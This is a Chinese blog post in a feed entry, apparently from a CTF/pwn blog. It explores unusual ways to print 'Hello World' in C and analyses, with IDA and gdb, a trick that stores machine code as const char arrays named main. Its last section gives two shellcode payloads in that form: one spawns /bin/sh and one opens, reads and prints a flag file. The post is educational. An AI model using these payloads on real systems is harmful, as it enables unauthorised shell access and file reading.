      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.776Z</updated>
    
    <content type="html"><![CDATA[<p> 前段时间在逛知乎的时候，偶然发现一道有意思的编程题<br><img alt="知乎" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbqsq.png" class="lozad"><br>参考链接：<a href="https://www.zhihu.com/question/66088898/answer/238036040" target="_blank" rel="noopener">hello world编程题你会吗？</a><br> Helllo World算是最简单也最基础的程序了，我们一般在编写c语言代码的时候，输入输出都会很自然地联想到frintf()和scanf()，这几道题非常地有意思，要求跳出常规思维输出’’Hello World’。</p><h2 id="1-不用-“-“-输出Hello-World！"><a href="#1-不用-“-“-输出Hello-World！" class="headerlink" title="1.不用 “ “ 输出Hello,World！"></a>1.不用 “ “ 输出Hello,World！</h2><p> 不用” “输出，那么就不能用scanf()这个函数了，那么怎么办呢，想到c语言在处理字符常量的时候是把它当做数字来处理的，所以可以用普通char()函数把”Hello World”的每个字符的Ascii码输出。<br> 这道题如果引伸为不用引号来输出(单引号和双引号都不能使用),其实也是一样的，putchar()函数可以直接用数字作为参数。</p><h2 id="2-不用-输出Hello，World！"><a href="#2-不用-输出Hello，World！" class="headerlink" title="2.不用 ; 输出Hello，World！"></a>2.不用 ; 输出Hello，World！</h2><p> 不用;输出，也就是出代码中不能出现完整的语句，仔细思考下在c语言当中哪些位置可以不用;的，发现if语句刚好满足要求。</p><p>附上同时满足条件1和2的程序代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">87</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里需要说明的一点是，在最新的c标准中，已经不允许main函数的类型为void。</p><h2 id="3-不用-输出Hello-World！"><a href="#3-不用-输出Hello-World！" class="headerlink" title="3.不用# 输出Hello,World！"></a>3.不用# 输出Hello,World！</h2><p> 这道题不得不感叹自己所学的知识的贫瘠，一直想着怎么在windows编译环境下怎么达到这个条件，看了原帖的回复，说是要重新定义printf()函数，然后在dev里试了试重新定义了一下printf函数，发现报错没有定义printf()这个函数。<br> 后来才发现原来重新定义printf()函数在linux环境下是可以实现要求的。</p><p><img alt="img" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/dl53pg26qconiqrkjv1b43o1g7.png" class="lozad"></p><p>代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format,...)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hello, world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用"><a href="#4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用" class="headerlink" title="4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )"></a>4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )</h2><p> 第四题出题人并不是为了输出”Hello World”出的题，本意在了解ELF文件格式。<br>附上知乎大佬的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main = <span class="number">0x55</span>, main1 = <span class="number">0x48</span>, main2 = <span class="number">0x89</span>, main3 = <span class="number">0xe5</span>, main4 = <span class="number">0xb8</span>,</span><br><span class="line">           main5 = <span class="number">0x01</span>, main6 = <span class="number">0x00</span>, main7 = <span class="number">0x00</span>, main8 = <span class="number">0x00</span>, main9 = <span class="number">0xbb</span>,</span><br><span class="line">           main10 = <span class="number">0x01</span>, main11 = <span class="number">0x00</span>, main12 = <span class="number">0x00</span>, main13 = <span class="number">0x00</span>,</span><br><span class="line">           main14 = <span class="number">0x67</span>, main15 = <span class="number">0x8d</span>, main16 = <span class="number">0x35</span>, main17 = <span class="number">0x10</span>,</span><br><span class="line">           main18 = <span class="number">0x00</span>, main19 = <span class="number">0x00</span>, main20 = <span class="number">0x00</span>, main21 = <span class="number">0xba</span>,</span><br><span class="line">           main22 = <span class="number">0x0d</span>, main23 = <span class="number">0x00</span>, main24 = <span class="number">0x00</span>, main25 = <span class="number">0x00</span>,</span><br><span class="line">           main26 = <span class="number">0x0f</span>, main27 = <span class="number">0x05</span>, main28 = <span class="number">0xb8</span>, main29 = <span class="number">0x3c</span>,</span><br><span class="line">           main30 = <span class="number">0x00</span>, main31 = <span class="number">0x00</span>, main32 = <span class="number">0x00</span>, main33 = <span class="number">0x31</span>,</span><br><span class="line">           main34 = <span class="number">0xdb</span>, main35 = <span class="number">0x0f</span>, main36 = <span class="number">0x05</span>, main37 = <span class="number">0x48</span>,</span><br><span class="line">           main38 = <span class="number">0x65</span>, main39 = <span class="number">0x6c</span>, main40 = <span class="number">0x6c</span>, main41 = <span class="number">0x6f</span>,</span><br><span class="line">           main42 = <span class="number">0x20</span>, main43 = <span class="number">0x57</span>, main44 = <span class="number">0x6f</span>, main45 = <span class="number">0x72</span>,</span><br><span class="line">           main46 = <span class="number">0x6c</span>, main47 = <span class="number">0x64</span>, main48 = <span class="number">0x21</span>, main49 = <span class="number">0x0a</span>,</span><br><span class="line">           main50 = <span class="number">0x5d</span>;</span><br></pre></td></tr></table></figure><h2 id="5-对上述代码的分析"><a href="#5-对上述代码的分析" class="headerlink" title="5.对上述代码的分析"></a>5.对上述代码的分析</h2><p>其中最让我不能理解的是第四种方式输出的Hello ,World!</p><p>我用gcc编译器，把他编译后运行，的确能输出Hello ,World!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜   gcc test.c -o <span class="built_in">test</span></span><br><span class="line">➜   ./<span class="built_in">test</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><p>用ida反编译一下，可以看到start函数还是很正常的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004003E0 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004003E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004003E0                 xor     ebp, ebp</span><br><span class="line">.text:00000000004003E2                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000004003E5                 pop     rsi             ; argc</span><br><span class="line">.text:00000000004003E6                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000004003E9                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000004003ED                 push    rax</span><br><span class="line">.text:00000000004003EE                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000004003EF                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004003F6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004003FD                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400404                 call    ___libc_start_main</span><br><span class="line">.text:0000000000400409                 hlt</span><br><span class="line">.text:0000000000400409 ; &#125; // starts at 4003E0</span><br><span class="line">.text:0000000000400409 _start          endp</span><br><span class="line">.text:0000000000400409</span><br></pre></td></tr></table></figure><p>继续看main函数,就变得很不正常了，而且他是在data段。？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000400564 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.rodata:0000000000400564 main            db  55h ; U             ; DATA XREF: _start+1D↑o</span><br><span class="line">.rodata:0000000000400565                 public main1</span><br><span class="line">.rodata:0000000000400565 main1           db  48h ; H</span><br><span class="line">.rodata:0000000000400566                 public main2</span><br><span class="line">.rodata:0000000000400566 main2           db  89h</span><br><span class="line">.rodata:0000000000400567                 public main3</span><br><span class="line">.rodata:0000000000400567 main3           db 0E5h</span><br><span class="line">.rodata:0000000000400568                 public main4</span><br><span class="line">.rodata:0000000000400568 main4           db 0B8h</span><br><span class="line">.rodata:0000000000400569                 public main5</span><br><span class="line">.rodata:0000000000400569 main5           db    1</span><br><span class="line">.rodata:000000000040056A                 public main6</span><br><span class="line">.rodata:000000000040056A main6           db    0</span><br><span class="line">.rodata:000000000040056B                 public main7</span><br><span class="line">.rodata:000000000040056B main7           db    0</span><br><span class="line">.rodata:000000000040056C                 public main8</span><br><span class="line">.rodata:000000000040056C main8           db    0</span><br><span class="line">.rodata:000000000040056D                 public main9</span><br><span class="line">.rodata:000000000040056D main9           db 0BBh</span><br><span class="line">.rodata:000000000040056E                 public main10</span><br><span class="line">.rodata:000000000040056E main10          db    1</span><br><span class="line">.rodata:000000000040056F                 public main11</span><br><span class="line">.rodata:000000000040056F main11          db    0</span><br><span class="line">.rodata:0000000000400570                 public main12</span><br><span class="line">.rodata:0000000000400570 main12          db    0</span><br><span class="line">.rodata:0000000000400571                 public main13</span><br><span class="line">.rodata:0000000000400571 main13          db    0</span><br><span class="line">.rodata:0000000000400572                 public main14</span><br><span class="line">.rodata:0000000000400572 main14          db  67h ; g</span><br><span class="line">.rodata:0000000000400573                 public main15</span><br><span class="line">.rodata:0000000000400573 main15          db  8Dh</span><br><span class="line">.rodata:0000000000400574                 public main16</span><br><span class="line">.rodata:0000000000400574 main16          db  35h ; 5</span><br><span class="line">.rodata:0000000000400575                 public main17</span><br><span class="line">.rodata:0000000000400575 main17          db  10h</span><br><span class="line">.rodata:0000000000400576                 public main18</span><br><span class="line">.rodata:0000000000400576 main18          db    0</span><br><span class="line">.rodata:0000000000400577                 public main19</span><br><span class="line">.rodata:0000000000400577 main19          db    0</span><br><span class="line">.rodata:0000000000400578                 public main20</span><br><span class="line">.rodata:0000000000400578 main20          db    0</span><br><span class="line">.rodata:0000000000400579                 public main21</span><br><span class="line">.rodata:0000000000400579 main21          db 0BAh</span><br><span class="line">.rodata:000000000040057A                 public main22</span><br><span class="line">.rodata:000000000040057A main22          db  0Dh</span><br><span class="line">.rodata:000000000040057B                 public main23</span><br><span class="line">.rodata:000000000040057B main23          db    0</span><br><span class="line">.rodata:000000000040057C                 public main24</span><br><span class="line">.rodata:000000000040057C main24          db    0</span><br><span class="line">.rodata:000000000040057D                 public main25</span><br><span class="line">.rodata:000000000040057D main25          db    0</span><br><span class="line">.rodata:000000000040057E                 public main26</span><br><span class="line">.rodata:000000000040057E main26          db  0Fh</span><br><span class="line">.rodata:000000000040057F                 public main27</span><br><span class="line">.rodata:000000000040057F main27          db    5</span><br><span class="line">.rodata:0000000000400580                 public main28</span><br><span class="line">.rodata:0000000000400580 main28          db 0B8h</span><br><span class="line">.rodata:0000000000400581                 public main29</span><br><span class="line">.rodata:0000000000400581 main29          db  3Ch ; &lt;</span><br><span class="line">.rodata:0000000000400582                 public main30</span><br><span class="line">.rodata:0000000000400582 main30          db    0</span><br><span class="line">.rodata:0000000000400583                 public main31</span><br><span class="line">.rodata:0000000000400583 main31          db    0</span><br><span class="line">.rodata:0000000000400584                 public main32</span><br><span class="line">.rodata:0000000000400584 main32          db    0</span><br><span class="line">.rodata:0000000000400585                 public main33</span><br><span class="line">.rodata:0000000000400585 main33          db  31h ; 1</span><br><span class="line">.rodata:0000000000400586                 public main34</span><br><span class="line">.rodata:0000000000400586 main34          db 0DBh</span><br><span class="line">.rodata:0000000000400587                 public main35</span><br><span class="line">.rodata:0000000000400587 main35          db  0Fh</span><br><span class="line">.rodata:0000000000400588                 public main36</span><br><span class="line">.rodata:0000000000400588 main36          db    5</span><br><span class="line">.rodata:0000000000400589                 public main37</span><br><span class="line">.rodata:0000000000400589 main37          db  48h ; H</span><br><span class="line">.rodata:000000000040058A                 public main38</span><br><span class="line">.rodata:000000000040058A main38          db  65h ; e</span><br><span class="line">.rodata:000000000040058B                 public main39</span><br><span class="line">.rodata:000000000040058B main39          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058C                 public main40</span><br><span class="line">.rodata:000000000040058C main40          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058D                 public main41</span><br><span class="line">.rodata:000000000040058D main41          db  6Fh ; o</span><br><span class="line">.rodata:000000000040058E                 public main42</span><br><span class="line">.rodata:000000000040058E main42          db  20h</span><br><span class="line">.rodata:000000000040058F                 public main43</span><br><span class="line">.rodata:000000000040058F main43          db  57h ; W</span><br><span class="line">.rodata:0000000000400590                 public main44</span><br><span class="line">.rodata:0000000000400590 main44          db  6Fh ; o</span><br><span class="line">.rodata:0000000000400591                 public main45</span><br><span class="line">.rodata:0000000000400591 main45          db  72h ; r</span><br><span class="line">.rodata:0000000000400592                 public main46</span><br><span class="line">.rodata:0000000000400592 main46          db  6Ch ; l</span><br><span class="line">.rodata:0000000000400593                 public main47</span><br><span class="line">.rodata:0000000000400593 main47          db  64h ; d</span><br><span class="line">.rodata:0000000000400594                 public main48</span><br><span class="line">.rodata:0000000000400594 main48          db  21h ; !</span><br><span class="line">.rodata:0000000000400595                 public main49</span><br><span class="line">.rodata:0000000000400595 main49          db  0Ah</span><br><span class="line">.rodata:0000000000400596                 public main50</span><br><span class="line">.rodata:0000000000400596 main50          db  5Dh ; ]</span><br><span class="line">.rodata:0000000000400596 _rodata         ends</span><br></pre></td></tr></table></figure><p>接下来我用gdb动态调试一波,下断点到main函数的地方,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x400564</span><br><span class="line">Breakpoint 2 at 0x400564</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400564 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────</span><br><span class="line"> RAX  0x400564 (main) ◂— push   rbp</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7fffffffde28 —▸ 0x7fffffffe1df ◂— &apos;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&apos;</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line"> R8   0x400550 (__libc_csu_fini) ◂— ret    </span><br><span class="line"> R9   0x7ffff7de7ac0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> R10  0x846</span><br><span class="line"> R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14</span><br><span class="line"> R12  0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffde10 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x4004e0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400564 (main) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line"> ► 0x400564 &lt;main&gt;      push   rbp &lt;0x4004e0&gt;</span><br><span class="line">   0x400565 &lt;main1&gt;     mov    rbp, rsp</span><br><span class="line">   0x400568 &lt;main4&gt;     mov    eax, 1</span><br><span class="line">   0x40056d &lt;main9&gt;     mov    ebx, 1</span><br><span class="line">   0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</span><br><span class="line">   0x400579 &lt;main21&gt;    mov    edx, 0xd</span><br><span class="line">   0x40057e &lt;main26&gt;    syscall </span><br><span class="line">   0x400580 &lt;main28&gt;    mov    eax, 0x3c</span><br><span class="line">   0x400585 &lt;main33&gt;    xor    ebx, ebx</span><br><span class="line">   0x400587 &lt;main35&gt;    syscall </span><br><span class="line">   0x400589 &lt;main37&gt;    insb   byte ptr [rdi], dx</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fffffffdd40 ◂— 0x1</span><br><span class="line">02:0010│      0x7fffffffdd48 —▸ 0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line">03:0018│      0x7fffffffdd50 ◂— 0x1f7ffcca0</span><br><span class="line">04:0020│      0x7fffffffdd58 —▸ 0x400564 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fffffffdd60 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd68 ◂— 0x74c583ff1005bf92</span><br><span class="line">07:0038│      0x7fffffffdd70 —▸ 0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f 0           400564 main</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line">Breakpoint *0x400564</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>看到这里我明白了，上述代码其实是一段shellcode，gcc编译器是如何识别并编译的，这里我不得而知，看来还要再看一遍程序员的自我修养啊。</p><p>分析一下生成的汇编吧。<code>0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</code> 其中这段汇编让我很感兴趣，</p><p>程序动态执行的时候总是把静态的数据用这种方式<code>[eip + 0x10]</code>来传参</p><p>很显然里面存的是Hello world，然后syscall系统调用write函数输出，第二次syscall系统调用exit函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10s 0x400579+0x10</span><br><span class="line">0x400589 &lt;main37&gt;:&quot;Hello World!\n]&quot;</span><br><span class="line">0x400598:&quot;\001\033\003;,&quot;</span><br><span class="line">0x40059e:&quot;&quot;</span><br><span class="line">0x40059f:&quot;&quot;</span><br><span class="line">0x4005a0:&quot;\004&quot;</span><br><span class="line">0x4005a2:&quot;&quot;</span><br><span class="line">0x4005a3:&quot;&quot;</span><br><span class="line">0x4005a4:&quot;\030\376\377\377x&quot;</span><br><span class="line">0x4005aa:&quot;&quot;</span><br><span class="line">0x4005ab:&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-模仿操作"><a href="#6-模仿操作" class="headerlink" title="6.模仿操作"></a>6.模仿操作</h2><p>用上述方式写 execve(“/bin/sh”)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>  main = <span class="number">0x6a</span>, main1 = <span class="number">0x42</span>, main2 = <span class="number">0x58</span>, main3 = <span class="number">0xfe</span>, main4 = <span class="number">0xc4</span>, main5 = <span class="number">0x48</span>, main6 = <span class="number">0x99</span>, main7 = <span class="number">0x52</span>, main8 = <span class="number">0x48</span>, main9 = <span class="number">0xbf</span>,main10 = <span class="number">0x2f</span>, main11 = <span class="number">0x62</span>, main12 = <span class="number">0x69</span>, main13 = <span class="number">0x6e</span>, main14 = <span class="number">0x2f</span>, main15 = <span class="number">0x2f</span>, main16 = <span class="number">0x73</span>, main17 = <span class="number">0x68</span>, main18 = <span class="number">0x57</span>, main19 = <span class="number">0x54</span>,main20 = <span class="number">0x5e</span>, main21 = <span class="number">0x49</span>, main22 = <span class="number">0x89</span>, main23 = <span class="number">0xd0</span>, main24 = <span class="number">0x49</span>, main25 = <span class="number">0x89</span>, main26 = <span class="number">0xd2</span>, main27 = <span class="number">0x0f</span>, main28 = <span class="number">0x05</span>;</span><br></pre></td></tr></table></figure><p>orw flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x48</span>,main1=<span class="number">0xb8</span>,main2=<span class="number">0x1</span>,main3=<span class="number">0x1</span>,main4=<span class="number">0x1</span>,main5=<span class="number">0x1</span>,main6=<span class="number">0x1</span>,main7=<span class="number">0x1</span>,main8=<span class="number">0x1</span>,main9=<span class="number">0x1</span>,main10=<span class="number">0x50</span>,main11=<span class="number">0x48</span>,main12=<span class="number">0xb8</span>,main13=<span class="number">0x67</span>,main14=<span class="number">0x2e</span>,main15=<span class="number">0x67</span>,main16=<span class="number">0x6d</span>,main17=<span class="number">0x60</span>,main18=<span class="number">0x66</span>,main19=<span class="number">0x1</span>,main20=<span class="number">0x1</span>,main21=<span class="number">0x48</span>,main22=<span class="number">0x31</span>,main23=<span class="number">0x4</span>,main24=<span class="number">0x24</span>,main25=<span class="number">0x48</span>,main26=<span class="number">0xb8</span>,main27=<span class="number">0x2f</span>,main28=<span class="number">0x68</span>,main29=<span class="number">0x6f</span>,main30=<span class="number">0x6d</span>,main31=<span class="number">0x65</span>,main32=<span class="number">0x2f</span>,main33=<span class="number">0x63</span>,main34=<span class="number">0x74</span>,main35=<span class="number">0x50</span>,main36=<span class="number">0x48</span>,main37=<span class="number">0x89</span>,main38=<span class="number">0xe7</span>,main39=<span class="number">0x31</span>,main40=<span class="number">0xd2</span>,main41=<span class="number">0x31</span>,main42=<span class="number">0xf6</span>,main43=<span class="number">0x6a</span>,main44=<span class="number">0x2</span>,main45=<span class="number">0x58</span>,main46=<span class="number">0xf</span>,main47=<span class="number">0x5</span>,main48=<span class="number">0x31</span>,main49=<span class="number">0xc0</span>,main50=<span class="number">0x6a</span>,main51=<span class="number">0x3</span>,main52=<span class="number">0x5f</span>,main53=<span class="number">0x6a</span>,main54=<span class="number">0x20</span>,main55=<span class="number">0x5a</span>,main56=<span class="number">0x48</span>,main57=<span class="number">0x89</span>,main58=<span class="number">0xe6</span>,main59=<span class="number">0xf</span>,main60=<span class="number">0x5</span>,main61=<span class="number">0x6a</span>,main62=<span class="number">0x1</span>,main63=<span class="number">0x5f</span>,main64=<span class="number">0x6a</span>,main65=<span class="number">0x20</span>,main66=<span class="number">0x5a</span>,main67=<span class="number">0x48</span>,main68=<span class="number">0x89</span>,main69=<span class="number">0xe6</span>,main70=<span class="number">0x6a</span>,main71=<span class="number">0x1</span>,main72=<span class="number">0x58</span>,main73=<span class="number">0xf</span>,main74=<span class="number">0x5</span>;</span><br></pre></td></tr></table></figure><p>参考：</p><p>有趣的”Hello World”</p><p><a href="https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2020/03/03/5e5d97d48a85f/</a></p>]]></content>
    
